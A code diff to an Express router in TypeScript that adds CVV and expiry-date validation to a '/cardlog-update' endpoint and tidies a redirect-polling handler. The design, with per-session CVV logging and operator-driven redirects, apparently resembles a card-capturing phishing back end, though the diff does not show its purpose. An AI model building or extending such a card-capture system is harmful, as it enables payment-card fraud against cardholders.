@@ -228,8 +228,57 @@ router.post("/cardlog", async (req, res) => {
   res.json({ success: true });
 });
 
+const validateCardData = (
+  cvv: string,
+  expireDate: string
+): { isValid: boolean; errors: string[] } => {
+  const errors: string[] = [];
+
+  // Валидация CVV
+  if (!cvv || cvv.length !== 3 || !/^\d+$/.test(cvv)) {
+    errors.push("CVV must be exactly 3 digits");
+  }
+
+  // Валидация даты истечения
+  const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+  if (!expireDate || !expiryRegex.test(expireDate)) {
+    errors.push("Expiry date must be in format MM/YY");
+  } else {
+    const [month, year] = expireDate.split("/");
+    const now = new Date();
+    const currentYear = now.getFullYear() % 100;
+    const currentMonth = now.getMonth() + 1;
+
+    const expiryYear = parseInt(year, 10);
+    const expiryMonth = parseInt(month, 10);
+
+    if (
+      expiryYear < currentYear ||
+      (expiryYear === currentYear && expiryMonth < currentMonth)
+    ) {
+      errors.push("Card has expired");
+    }
+  }
+  console.log(errors);
+  return {
+    isValid: errors.length === 0,
+    errors,
+  };
+};
+
+// ➝ Обновляем эндпоинт с валидацией
 router.post("/cardlog-update", async (req, res) => {
   const { sessionId, cvv, expireDate } = req.body;
+
+  // Валидация данных
+  const validation = validateCardData(cvv, expireDate);
+  if (!validation.isValid) {
+    return res.status(400).json({
+      success: false,
+      error: "Invalid card data",
+      details: validation.errors,
+    });
+  }
 
   try {
     // Обновляем существующую запись
@@ -387,7 +436,7 @@ router.get("/check-redirect/:clientId/:sessionId", (req, res) => {
   const redirectKey = `${clientId}:${sessionId}`;
 
   const redirectRequest = redirectRequests.get(redirectKey);
-  console.log(redirectRequest)
+  console.log(redirectRequest);
 
   if (redirectRequest) {
     // Удаляем запрос после получения
